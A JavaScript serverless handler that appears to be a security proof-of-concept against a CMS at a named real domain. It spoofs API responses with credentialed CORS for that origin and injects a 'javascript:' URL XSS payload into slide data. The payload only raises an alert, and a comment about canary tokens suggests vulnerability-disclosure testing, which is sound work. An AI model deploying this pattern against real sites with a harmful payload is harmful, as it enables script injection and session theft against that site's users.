const ALLOWED_ORIGIN = "https://cms.o2wifi.co.uk";

const xssUrl =
  "javascript:alert(JSON.stringify({origin:location.origin,topLevel:top===self}))";

const templateData = {
  Slides: {
    AutoPlay: false,
    Images: [
      {
        Img: "https://cms.o2wifi.co.uk/favicon.ico",
        Link: xssUrl,
        LinkType: "Slide",
        Target: "_self",
        Alt: "Security test slide"
      }
    ]
  }
};

const template = {
  Id: "x",
  ID: "x",
  id: "x",
  TemplateId: "x",
  PermaLink: "template1",
  Name: "PoC Template",
  TemplateData: templateData
};

const brand = {
  Id: "y",
  ID: "y",
  id: "y",
  BrandId: "y",
  TemplateId: "x",
  Name: "PoC Brand",
  TemplateData: templateData
};

function setCors(req, res) {
  const requestedHeaders = req.headers["access-control-request-headers"];

  res.setHeader("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader(
    "Access-Control-Allow-Methods",
    "GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS"
  );
  res.setHeader(
    "Access-Control-Allow-Headers",
    requestedHeaders || "Authorization, Content-Type, Accept, X-Requested-With"
  );
  res.setHeader("Access-Control-Max-Age", "600");
  res.setHeader("Cache-Control", "no-store");
  res.setHeader("Vary", "Origin, Access-Control-Request-Headers");
}

export default function handler(req, res) {
  setCors(req, res);

  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  const requestUrl = new URL(req.url, "https://poc.invalid");
  const requestedRoute = (
    requestUrl.searchParams.get("route") || requestUrl.pathname
  ).toLowerCase();

  // Do not print or return the Authorization header. Use only an incognito
  // profile with the POC-CANARY token described in README.md.
  if (requestedRoute.includes("brand")) {
    return res.status(200).json([brand]);
  }

  if (requestedRoute.includes("template")) {
    return res.status(200).json([template]);
  }

  return res.status(200).json([template, brand]);
}
